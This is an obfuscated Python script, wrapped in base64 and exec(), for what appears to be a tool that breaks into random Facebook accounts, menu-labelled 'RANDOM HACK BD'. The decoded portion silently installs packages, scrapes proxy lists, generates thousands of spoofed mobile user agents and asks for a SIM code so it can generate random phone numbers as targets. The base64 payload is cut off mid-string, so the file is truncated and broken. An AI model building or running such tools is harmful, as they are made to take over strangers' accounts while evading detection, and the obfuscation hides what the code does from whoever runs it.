#Encrypt by MAHADI HASAN AFRIDI
#Github : https://github.com/MAHADI-143
import base64
exec(base64.b64decode('DQppbXBvcnQgb3Msc3lzLHRpbWUsanNvbixyYW5kb20scmUsc3RyaW5nLHBsYXRmb3JtLGJhc2U2NCx1dWlkDQpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cCBhcyBzb3ANCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwDQppbXBvcnQgcmVxdWVzdHMgYXMgcmVzcw0KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZQ0KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUNCmZyb20gdGltZSBpbXBvcnQgc2xlZXANCmZyb20gb3MgaW1wb3J0IHN5c3RlbSBhcyBzDQpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwIGFzIHdha3R1DQp0cnk6DQogICAgaW1wb3J0IHJlcXVlc3RzDQogICAgZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvciBhcyBUaHJlYWRQb29sDQogICAgaW1wb3J0IG1lY2hhbml6ZQ0KICAgIGZyb20gcmVxdWVzdHMuZXhjZXB0aW9ucyBpbXBvcnQgQ29ubmVjdGlvbkVycm9yDQpleGNlcHQgTW9kdWxlTm90Rm91bmRFcnJvcjoNCiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIG1lY2hhbml6ZSByZXF1ZXN0cyBmdXR1cmVzIGJzND09MiA+IC9kZXYvbnVsbCcpDQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBiczQnKQ0KUkVEID0gJ1wwMzNbMTs5MW0nDQpXSElURSA9ICdcMDMzWzE7OTdtJw0KR1JFRU4gPSAnXDAzM1sxOzMybScgDQpZRUxMT1cgPSAnXDAzM1sxOzMzbScNCkJMVUUgPSAnXDAzM1sxOzM0bScNCk9SQU5HRSA9ICdcMDMzWzE7MzVtJw0KUCA9ICdceDFiWzE7OTdtJyANCk0gPSAnXHgxYlsxOzkxbScgDQpIID0gJ1x4MWJbMTs5Mm0nIA0KSyA9ICdceDFiWzE7OTNtJyANCkIgPSAnXHgxYlsxOzk0bScgDQpVID0gJ1x4MWJbMTs5NW0nIA0KTyA9ICdceDFiWzE7OTZtJyANCk4gPSAnXHgxYlswbScgICAgDQpBID0gJ1x4MWJbMTs5MG0nIA0KQk4gPSAnXHgxYlsxOzEwN20nIA0KQkJMID0gJ1x4MWJbMTsxMDZtJyANCkJQID0gJ1x4MWJbMTsxMDVtJyANCkJCID0gJ1x4MWJbMTsxMDRtJyANCkJLID0gJ1x4MWJbMTsxMDNtJyANCkJIID0gJ1x4MWJbMTsxMDJtJyANCkJNID0gJ1x4MWJbMTsxMDFtJyANCkJBID0gJ1x4MWJbMTsxMDBtJyANCm5vdyA9IGRhdGV0aW1lLm5vdygpDQpkdF9zdHJpbmcgPSBub3cuc3RyZnRpbWUoIiVIOiVNIikNCmN1cnJlbnQgPSBkYXRldGltZS5ub3coKQ0KdGEgPSBjdXJyZW50LnllYXINCmJ1ID0gY3VycmVudC5tb250aA0KaGEgPSBjdXJyZW50LmRheQ0KdG9kYXkgPSBkYXRlLnRvZGF5KCkgDQpsb29wID0gMA0Kb2tzID0gW10NCmNwcyA9IFtdDQp1Z2VuMj1bXQ0KdWdlbj1bXQ0KDQp1Z2VuID0gWyJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTQ7IFNNLUozMjBZIEJ1aWxkL1RQMUEuMjIwNjI0LjAxNDsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS82Mi4wLjU2NjkuNzMgTW9iaWxlIFNhZmFyaS81MzcuMzYiXQ0KdWdlbiA9IFsiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBTTS1KMzEwOSBCdWlsZC9UUDFBLjIyMDYyNC4wMTQ7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvOTkuMC41MzI2LjgyIE1vYmlsZSBTYWZhcmkvNTM3LjM2Il0NCnVnZW4gPSBbIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4OyBTTS1KMzIwWSBCdWlsZC9UUDFBLjIyMDYyNC4wMTQ7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvMTAzLjAuNTQ3OS40OSBNb2JpbGUgU2FmYXJpLzUzNy4zNiJdDQp1Z2VuID0gWyJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTM7IFNNLUozMTA5IEJ1aWxkL1RQMUEuMjIwNjI0LjAxNDsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS85OS4wLjU5MDMuNDggTW9iaWxlIFNhZmFyaS81MzcuMzYiXQ0KdWdlbiA9IFsiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDE0OyBTTS1KMzIwUCBCdWlsZC9UUDFBLjIyMDYyNC4wMTQ7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvNTAuMC40Nzc3LjYzIE1vYmlsZSBTYWZhcmkvNTM3LjM2Il0NCnVnZW4gPSBbIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxNDsgU00tSjMyMFkgQnVpbGQvVFAxQS4yMjA2MjQuMDE0OyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzQwLjAuMzAxMS4zNCBNb2JpbGUgU2FmYXJpLzUzNy4zNiJdDQp1Z2VuID0gWyJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IFNNLUozMTA5IEJ1aWxkL1RQMUEuMjIwNjI0LjAxNDsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS85Mi4wLjQzMzYuOTEgTW9iaWxlIFNhZmFyaS81MzcuMzYiXQ0KdWdlbiA9IFsiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBTTS1KMzIwRyBCdWlsZC9UUDFBLjIyMDYyNC4wMTQ7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvNjAuMC41NTY1Ljg2IE1vYmlsZSBTYWZhcmkvNTM3LjM2Il0NCnVnZW4gPSBbIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMTsgU00tSjMyMEggQnVpbGQvVFAxQS4yMjA2MjQuMDE0OyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzU4LjAuNTUwOC45MiBNb2JpbGUgU2FmYXJpLzUzNy4zNiJdDQp1Z2VuID0gWyJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTU7IFNNLUozMjBQIEJ1aWxkL1RQMUEuMjIwNjI0LjAxNDsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS80NS4wLjQzNDIuNDggTW9iaWxlIFNhZmFyaS81MzcuMzYiXQ0KdWdlbiA9IFsiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDE0OyBTTS1OOTg2VSBCdWlsZC9UUDFBLjIyMDYyNC4wMTQ7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvOTEuMC4zMjQyLjg1IE1vYmlsZSBTYWZhcmkvNTM3LjM2Il0NCnVnZW4gPSBbIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMTsgU00tSjMyMEggQnVpbGQvVFAxQS4yMjA2MjQuMDE0OyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzU4LjAuNTUwOC45MiBNb2JpbGUgU2FmYXJpLzUzNy4zNiJdDQp1Z2VuID0gWyJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTM7IFNNLU45ODZVIEJ1aWxkL1RQMUEuMjIwNjI0LjAxNDsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS81NS4wLjM0OTUuOTggTW9iaWxlIFNhZmFyaS81MzcuMzYiXQ0KdWdlbiA9IFsiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDk7IFNNLU45ODZVIEJ1aWxkL1RQMUEuMjIwNjI0LjAxNDsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS85My4wLjUyNjAuNDUgTW9iaWxlIFNhZmFyaS81MzcuMzYiXQ0KdWdlbiA9IFsiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEzOyBTTS1OOTg2VSBCdWlsZC9UUDFBLjIyMDYyNC4wMTQ7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvNzkuMC40NTczLjIyIE1vYmlsZSBTYWZhcmkvNTM3LjM2Il0NCnVnZW4gPSBbIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMzsgU00tTjk4NlUgQnVpbGQvVFAxQS4yMjA2MjQuMDE0OyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzU4LjAuNTA0Ni43NCBNb2JpbGUgU2FmYXJpLzUzNy4zNiJdDQp1Z2VuID0gWyJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IFNNLUozMjBIIEJ1aWxkL1RQMUEuMjIwNjI0LjAxNDsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS81MC4wLjM3NjcuOTEgTW9iaWxlIFNhZmFyaS81MzcuMzYiXQ0KdWdlbiA9IFsiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDExOyBTTS1OOTg2VSBCdWlsZC9UUDFBLjIyMDYyNC4wMTQ7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvMTA5LjAuMzI3NS42OSBNb2JpbGUgU2FmYXJpLzUzNy4zNiJdDQp1Z2VuID1bIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IDExOyBXaW5kb3dzIE5UIDEwLjBONTBHKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKTEwMC4wLjQ1MjAuNzIgQ2hyb21lLzEwOS4wLjAuMCBTYWZhcmkvNTM3LjM2Il0NCmNva2JydXQ9W10NCnNlcz1yZXF1ZXN0cy5TZXNzaW9uKCkNCnByaW5jcD1bXQ0KZGVmIF9faW5pdF9fKHNlbGYpOg0KICAgICAgICBzZWxmLmlkID0gW10NCiAgICAgICAgc2VsZi5vayA9IFtdDQogICAgICAgIHNlbGYuY3AgPSBbXQ0KICAgICAgICBzZWxmLmxvb3AgPSAwDQp0cnk6DQogcHJveD0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2FwaS5wcm94eXNjcmFwZS5jb20vdjIvP3JlcXVlc3Q9ZGlzcGxheXByb3hpZXMmcHJvdG9jb2w9c29ja3M0JnRpbWVvdXQ9MTAwMDAwJmNvdW50cnk9YWxsJnNzbD1hbGwmYW5vbnltaXR5PWFsbCcpLnRleHQNCiBvcGVuKCcucHJveC50eHQnLCd3Jykud3JpdGUocHJveCkNCmV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiBwcmludCgnJykNCnByb3g9b3BlbignLnByb3gudHh0JywncicpLnJlYWQoKS5zcGxpdGxpbmVzKCkNCmZvciB4ZCBpbiByYW5nZSgxMDAwMCk6DQogICAgYT0nTm9raWEnDQogICAgYj1yYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onXSkNCiAgICBjPXJhbmRvbS5yYW5kcmFuZ2UoMSwgOTkpDQogICAgZD0nL0dvQnJvd3Nlci8nDQogICAgZT0nMS42LjAuJw0KICAgIGY9cmFuZG9tLnJhbmRyYW5nZSgxLCA5OSkNCiAgICB1YWt1Mj0oZid7YX17Yn17Y317ZH17ZX17Zn0nKQ0KICAgIHVnZW4uYXBwZW5kKHVha3UyKQ0KZm9yIHVhIGluIHJhbmdlKDUwMDApOg0KICAgICAgYT0nTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkJw0KICAgICAgYj1yYW5kb20uY2hvaWNlKFsnNS4xLjEnICwgJzYuMC4xJyAsICc3LjEuMScgLCAnMTInICwgJzEzJyAsICcxNCcgLCAnMTUnXSkNCiAgICAgIHk9cmFuZG9tLmNob2ljZShbJ1NNLUozMjBIJyAsICdTTS1KMzEwOScgLCAnSjMyMEZOJyAsICdTTS1KMzIwUCcgLCAnU00tSjMyMEYnICwgJ1NNLUozMjBHJyAsICdTTS1KMzIwWSddKQ0KICAgICAgYz0nQnVpbGQvTE1ZNDdYOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLycNCiAgICAgIGQ9cmFuZG9tLnJhbmRyYW5nZSg0MCwxMTUpDQogICAgICBlPScwJw0KICAgICAgZj1yYW5kb20ucmFuZHJhbmdlKDMwMDAsNjAwMCkNCiAgICAgIGc9cmFuZG9tLnJhbmRyYW5nZSgyMCwxMDApDQogICAgICBoPSdNb2JpbGUgU2FmYXJpLzUzNy4zNicNCiAgICAgIHVnPShmInthfSB7Yn07IHt5fSB7Y317ZH0ue2V9LntmfS57Z30ge2h9IikNCiAgICAgIHVnZW4uYXBwZW5kKHVnKQ0KZm9yIHVhIGluIHJhbmdlKDUwMDApOg0KCWE9J01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCcNCgliPXJhbmRvbS5jaG9pY2UoWyc4JywnOScsJzEwJywnMTEnLCcxMicsJzEzJywnMTQnLCcxNSddKQ0KCWM9J2l0ZWwgUzY2MUxQIEJ1aWxkL1JQMUEuMjAxMDA1LjAwMTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8nDQoJZD1yYW5kb20ucmFuZHJhbmdlKDQwLDExNSkNCgllPScwJw0KCWY9cmFuZG9tLnJhbmRyYW5nZSgzMDAwLDYwMDApDQoJZz1yYW5kb20ucmFuZHJhbmdlKDIwLDEwMCkNCgloPSdNb2JpbGUgU2FmYXJpLzUzNy4zNicNCglhbGhhaj0oZiJ7YX0ge2J9OyB7Y317ZH0ue2V9LntmfS57Z30ge2h9IikNCgl1Z2VuLmFwcGVuZChhbGhhaikNCmZvciB1YSBpbiByYW5nZSg1MDAwKToNCiAgICBhPSdOb2tpYVgnDQogICAgYj1yYW5kb20ucmFuZHJhbmdlKDEsOSkNCiAgICBjPSctMCcNCiAgICBkPXJhbmRvbS5yYW5kcmFuZ2UoMSw5KQ0KICAgIGU9Jy8nDQogICAgZj1yYW5kb20ucmFuZHJhbmdlKDEsOSkNCiAgICBnPScuMCAoJw0KICAgIGg9cmFuZG9tLnJhbmRyYW5nZSgxLDEyKQ0KICAgIGk9J1Byb2ZpbGUvTUlEUC0yLjEgQ29uZmlndXJhdGlvbi9DTERDLTEuMScNCiAgICBqPSdVTlRSVVNURUQvJw0KICAgIGs9cmFuZG9tLnJhbmRyYW5nZSgxLDMpDQogICAgbD0nLjAnDQogICAgYWxoYWo9Zid7YX17Yn17Y317ZH17ZX17Zn17Z317aH17aX17an17a317bH0nDQogICAgdWdlbi5hcHBlbmQoYWxoYWopDQoNCmltcG9ydCBvcw0KaW1wb3J0IG9zDQpvcy5zeXN0ZW0oJ2VzcGVhayAtYSAzMDAgIiBXRUxDT01FIENPTUUgVE8gTC1TIEJST1RIRVIgUkFORE9NIFRPT0wgIicpDQpvcy5zeXN0ZW0oIldFTENPTUUgQ09NRSBUTyBMLVMgQlJPVEhFUiBSQU5ET00gVE9PTCAiKQ0KDQpvcy5zeXN0ZW0oJ2VzcGVhayAtYSAzMDAgIiBUT09MIFZJIFBSSU5DIExJTU9OICAiJykNCm9zLnN5c3RlbSgicGlwIGluc3RhbGwgcmVxdWVzdHMiKQ0Kb3Muc3lzdGVtKCJjbGVhciIpDQpmb3IgdWEgaW4gcmFuZ2UoNTAwMCk6DQoJYT0nTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkJw0KCWI9cmFuZG9tLmNob2ljZShbJzgnLCc5JywnMTAnLCcxMScsJzEyJywnMTMnLCcxNCcsJzE1J10pDQoJeT1yYW5kb20uY2hvaWNlKFsnUk1YMzU3MScsJ1JNWDM1MTEnLCdSTVgzNDYxJywnUk1YMzc0MScsJ1JNUDIxMDcnLCdSTVgzNTcyJywnUk1YMTkyMScsJ1JNWDMxMjEnLCdSTVgzMTIxJywnUk1YMzM1MCcsJ1JNWDM1MTEnXSkNCgljPSdCdWlsZC9UUDFBLjIyMDkwNS4wMDE7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvJw0KCWQ9cmFuZG9tLnJhbmRyYW5nZSg0MCwxMTUpDQoJZT0nMCcNCglmPXJhbmRvbS5yYW5kcmFuZ2UoMzAwMCw2MDAwKQ0KCWc9cmFuZG9tLnJhbmRyYW5nZSgyMCwxMDApDQoJaD0nTW9iaWxlIFNhZmFyaS81MzcuMzYnDQoJYWxoYWo9KGYie2F9IHtifTsge3l9IHtjfXtkfS57ZX0ue2Z9LntnfSB7aH0iKQ0KCXVnZW4uYXBwZW5kKGFsaGFqKQ0Kb3Muc3lzdGVtKCJ4ZGctb3BlbiBodHRwczovL2ZhY2Vib29rLmNvbS9ncm91cHMvMzM3MzI2MTg1NTQyOTA2LyIpDQojIExPR08NCmxvZ28gPSAoIiIiDQpcMDMzWzA7OTJt4pWU4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pWXICAgICAgDQoNCiAgICAgICAgICAgICAgICAgICAgIA0KXDMzWzE7MzJtODggICAgIDg4IDhiICAgIGQ4ICBkUCJZYiAgODhiIDg4IA0KXDMzWzE7MzJtODggICAgIDg4IDg4YiAgZDg4IGRQICAgWWIgODhZYjg4IA0KXDMzWzE7MzJtODggIC5vIDg4IDg4WWJkUDg4IFliICAgZFAgODggWTg4IA0KXDMzWzE7MzJtODhvb2Q4IDg4IDg4IFlZIDg4ICBZYm9kUCAgODggIFk4ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KXDAzM1swOzkybeKVmuKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKVnQ0K4pWU4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pWXDQrilZFcMzNbMDs0MW0gICAgWyBXT1JLSU5HIE1PQklMRSBEQVRBIEFORCBXSUZJIEFMU08gXSAgICBcMDMzWzA7OTJt4pWRDQrilZrilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilZ0NClwwMzNbMDs5NG3ilZTilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilZdcMDMzWzE7MzNtIA0K4pWg4pWQ4pWQW0F1dGhvciAgICAgICAgICAgICAgICAgIOKAoiBcMzNbMTszOG17UFJJTkMgTElNT059IFwzM1sxOzM4bSAg4pWRXDAzM1sxOzMxbSANCuKVoOKVkOKVkFtGYWNlYm9vayAgICAgICAgICAgICAgICAg4oCiIHtQUklOQyBMSU1PTn0gIOKVkSAgXDAzM1sxOzk3bSAgDQrilaDilZDilZBbR2l0aHViICAgICAgICAgICAgICAgICAgIOKAoiBcMzNbMTszOG17U1NDLUxPTH0gICAgICDilZFcMzNbMTszNG0gICANCuKVoOKVkOKVkFtXaGF0c2FwcCAgICAgICAgICAgICAgICAg4oCiIHswMTMqKioqKip9ICAgICDilZFcMzNbMTszNW0gDQrilaDilZDilZBbVE9PTFMgICAgICAgICAgICAgICAgICAgIOKAoiB7ZnJlZX0gICAgICAgICDilZEgXDMzWzE7MzJtICAgDQrilaDilZDilZBbVkVSU0lPTiAgICAgICAgICAgICAgICAgIOKAoiB7MC4xfSAgICAgICAgICDilZFcMDMzWzE7MzVtIA0KXDAzM1swOzk0beKVmuKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKVnVwwMzNbMTszMW0iIiIpDQoNCiMgTUFJTiBNQU5VIA0KZGVmIE1haW4oKToNCiAgICAgICAgb3Muc3lzdGVtKCJjbGVhciIpDQogICAgICAgIHByaW50KGxvZ28pDQogICAgICAgIHByaW50KCJcMDMzWzE7MzRt4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBIikNCiAgICAgICAgcHJpbnQoIiBcMDMzWzE7MzVtW1wwMzNbMTszMm0xXDAzM1sxOzM1bV0gXDAzM1sxOzMybVJBTkRPTSBIQUNLIEJEIikNCiAgICAgICAgcHJpbnQoIiBcMDMzWzE7MzVtW1wwMzNbMTszMm0yXDAzM1sxOzM1bV0gXDAzM1sxOzMybUNPTlRBQ1QgQURNSU4iKQ0KICAgICAgICBwcmludCgiIFwwMzNbMTszNW1bXDAzM1sxOzMybTBcMDMzWzE7MzVtXSBcMDMzWzE7MzFtRVhJVCIpDQogICAgICAgIHByaW50KCJcMDMzWzE7MzRt4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBIikNCiAgICAgICAgQWxoYWogPWlucHV0KCJcbiBcMDMzWzE7MzVtW/CfmIFcMDMzWzE7MzVtXSBcMDMzWzE7MzJtU0VMRUNURUQgWU9VUiBPUFRJT04gOiAiKQ0KICAgICAgICBpZiBBbGhhaiBpbiBbIjEiLCIwMSJdOg0KICAgICAgICAgICAgc2V4eSgpDQogICAgICAgIGlmIEFsaGFqIGluIFsiMiIsIjAyIl06DQogICAgICAgIAlvcy5zeXN0ZW0oJ3hkZy1vcGVuIHQubWUvLm1lLys4ODAxMzA5NDcyMzMwJykNCiAgICAgICAgaWYgQWxoYWogaW4gWyIgMCIsICIwMCJdOg0KICAgICAgICAgICAgZXhpdCgpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBleGl0KCkgICAgIA0KZGVmIHNleHkoKToNCiAgICB1c2VyPVtdDQogICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgcHJpbnQobG9nbykNCiAgICBwcmludCgi4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBIikNCiAgICBwcmludCgnXDAzM1sxOzMybVvwn5iFXDAzM1sxOzMybV1cMDMzWzE7MzZtIEV4YW1wbGUgOiBcMDMzWzE7MzJtW1wwMzNbMTszM20wMTZcMDMzWzE7MzJtXVwwMzNbMTszNW0gW1wwMzNbMTszMm0wMTdcMDMzWzE7MzVtXSBcMDMzWzE7MzNtW1wwMzNbMTszNG0wMThcMDMzWzE7MzNtXSBcMDMzWzE7MzRtW1wwMzNbMTszM20wMTlcMDMzWzE7MzRtXScpDQogICAgcHJpbnQoIuKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgSIpDQogICAgY29kZSA9IGlucHV0KCdcMDMzWzE7MzNtW/CfmK1cMDMzWzE7MzJtXVwwMzNbMTszMm0gWU9VUiBTSU0gQ09ERSA6ICcpDQogICAgbmFtZSA9ICcnLmpvaW4ocmFuZG9tLmNob2ljZShzdHJpbmcuZGlnaXRzKSBmb3IgXyBpbiByYW5nZSgyKSkNCiAgICBjb2QgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2Uoc3RyaW5nLmRpZ2l0cykgZm9yIF8gaW4gcmFuZ2UoMikpDQogICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgcHJpbnQobG9nbykNCiAgICBwcmludCgi4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBIikNCiAgICBwcmludCgnXDAzM1sxOzMybVvwn5iBXDAzM1sxOzMybV1cMDMzWzE7MzZtIEV4YW1wbGUgOiBcMDMzWzE7MzJtW1wwMzNbMTszM20zMDAwXDAzM1sxOzMybV1cMDMzWzE7MzVtIFtcMDMzWzE7MzJtNTAwMFwwMzNbMTszNW1dIFwwMzNbMTszM21bXDAzM1sxOzM0bTEwMDAwXDAzM1sxOzMzbV0gJykNCiAgICBwcmludCgi4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBIikNCiAgICBsaW1pdCA9IGludChpbnB1dCgnXDAzM1sxOzMzbV